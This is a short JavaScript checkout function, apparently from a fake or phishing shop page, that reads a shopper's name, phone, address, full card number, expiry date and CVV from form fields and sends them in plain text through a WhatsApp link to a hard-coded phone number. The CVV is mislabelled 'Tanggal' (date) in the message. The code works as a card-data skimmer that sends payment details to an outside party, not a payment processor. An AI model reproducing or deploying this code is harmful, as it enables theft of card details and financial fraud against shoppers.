function checkout() {
    // Get input values
    const name = document.getElementById("name").value;
    const phone = document.getElementById("phone").value;
    const address = document.getElementById("address").value;
    const cardNumber = document.getElementById("cardNumber").value;
    const expiryMonth = document.getElementById("expiryMonth").value;
    const expiryYear = document.getElementById("expiryYear").value;
    const productX = document.getElementById("productX").value;
    const cvv = document.getElementById("cvv").value;


    // Create message text
    const message = `New order:\n\nName: ${name}\nNo Handphone: ${phone}\nAlamat: ${address}\nCard Number: ${cardNumber}\nBulan: ${expiryMonth}\nTahun: ${expiryYear}\nProduct: ${productX}\nTanggal: ${cvv}`;

    // Create WhatsApp message URL
    const whatsappUrl = `https://api.whatsapp.com/send?phone=6281310913732&text=${encodeURIComponent(message)}`;

    // Open WhatsApp URL in new window
    window.open(whatsappUrl);

}